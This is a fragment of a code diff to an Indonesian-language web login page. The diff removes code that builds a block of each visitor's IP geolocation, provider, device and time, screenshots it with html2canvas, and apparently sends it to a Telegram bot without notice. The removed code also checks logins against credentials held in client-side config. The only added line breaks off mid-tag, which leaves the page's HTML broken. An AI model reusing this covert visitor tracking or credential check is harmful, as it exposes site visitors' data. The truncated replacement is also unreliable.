@@ -264,29 +264,4 @@
         Panel: ${selectedMenu.text}<br>
         Lokasi: ${info.city}, ${info.region}, ${info.country_name}<br>
         Provider: ${info.org}<br>
-        Device: ${device}<br>
-        Waktu: ${waktu}
-      `;
-
-      html2canvas(document.getElementById('captureArea')).then(canvas => {
-        sendImageToTelegram(canvas);
-      });
-
-      if (username === selectedMenu.user && password === selectedMenu.pass) {
-        showNotification("Login Berhasil!", "success");
-        closeLoginModal();
-        setTimeout(() => window.location.href = selectedMenu.url, 1500);
-      } else {
-        showNotification("Username atau Password salah!", "error");
-      }
-    }
-
-    menuConfig.forEach(menu => {
-      const btn = document.createElement('button');
-      btn.textContent = menu.text;
-      btn.onclick = () => showLoginModal(menu);
-      menuButtons.appendChild(btn);
-    });
-  </script>
-</body>
-</html>
+        Device: ${device}<br
